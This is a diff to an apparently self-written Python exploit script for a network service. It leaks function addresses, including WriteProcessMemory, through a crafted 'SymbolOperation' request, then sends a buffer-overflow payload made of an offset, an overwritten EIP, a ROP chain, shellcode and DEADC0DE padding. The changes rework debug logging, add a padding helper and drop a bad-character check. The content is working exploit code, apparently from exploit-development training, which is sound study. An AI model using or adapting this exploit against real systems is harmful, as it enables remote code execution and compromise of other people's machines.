@@ -256,7 +256,10 @@ def checkBadChars(data):
     return False
 
 
-def sendMalBuff(buf, socketTup):
+DEBUG_Response = False
+
+
+def sendMalBuff(buf, socketTup, DEBUG_Response=False):
     timeout_seconds = 5
     try:
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
@@ -269,18 +272,18 @@ def sendMalBuff(buf, socketTup):
 
             # Send the buffer to the server
             s.sendall(buf)
-            if DEBUG:
+            if DEBUG_Response:
                 printBuffer(buf, width="dd")
                 log(f"Sent {len(buf)} bytes successfully!", level="+")
 
             # Print out response from server
-            if DEBUG:
+            if DEBUG_Response:
                 log("Waiting for response from server...", level="*")
             response = b""
             while True:
                 try:
                     chunk = s.recv(1024)
-                    if DEBUG:
+                    if DEBUG_Response:
                         log(f"Received chunk: {chunk}", level="!!!")
                 except socket.timeout:
                     break
@@ -306,8 +309,7 @@ def sendMalBuff(buf, socketTup):
 
 def leakFunctionAddress(func, socketTup):
 
-    if DEBUG:
-        log(f"Attempting to leak address for {func.decode('utf-8').strip(chr(0))}...", level="*")
+    log(f"Attempting to leak address for {func.decode('utf-8').strip(chr(0))}...", level="*")
     # Append SymbolOperation to the Func
     symOpFunc = b"SymbolOperation" + func
 
@@ -333,7 +335,7 @@ def leakFunctionAddress(func, socketTup):
     # Checksum
     buf = pack(">i", len(buf) - 4) + buf
 
-    response = sendMalBuff(buf, socketTup)
+    response = sendMalBuff(buf, socketTup, DEBUG_Response=False)
     if response:
         # Should have a valid response, parse it and get the address
         functionAddress = parseResponse(response)
@@ -434,6 +436,16 @@ def parse_args():
     return parser.parse_args()
 
 
+def repeat_bytes(pattern, length):
+    if isinstance(pattern, str):
+        pattern = bytes.fromhex(pattern.replace("0x", ""))
+
+    if not pattern:
+        raise ValueError("Pattern cannot be empty")
+
+    return (pattern * ((length + len(pattern) - 1) // len(pattern)))[:length]
+
+
 def main():
     global BASE_ADDR_BAD
     args = parse_args()
@@ -454,8 +466,6 @@ def main():
         # Leak addresses of functions
         for func in functions:
             leakedAddresses.append(leakFunctionAddress(func, (server, port)))
-            if checkBadChars(pack("<L", leakedAddresses[-1])):
-                BASE_ADDR_BAD = True
 
         WPMAddr = leakedAddresses[1]  # WriteProcessMemory address
         exportedFunc = leakedAddresses[0]  # N98E_CRYPTO_get_new_lockid address
@@ -670,7 +680,7 @@ def main():
         # padding = b"D" * (0x1000 - 276 - 4 - len(rop) - len(offset2) - len(shellcode))
         # TEST CODE
         padding_len = 0x1000 - 276 - 4 - len(rop) - len(offset2) - len(shellcode)
-        padding = (b"\xde\xad\xc0\xde" * ((padding_len + 3) // 4))[:padding_len]
+        padding = repeat_bytes("DEADC0DE", padding_len)
 
         # Prepare buffer + add checksum
         buffer = offset + wpm + eip + rop + offset2 + shellcode + padding
@@ -686,7 +696,7 @@ def main():
 
         # Send Final Buffer
         log("Sending final buffer...", level="*")
-        sendMalBuff(buf, (server, port))
+        sendMalBuff(buf, (server, port), DEBUG_Response=True)
 
     except KeyboardInterrupt:
         log("User requested shutdown", level="-")
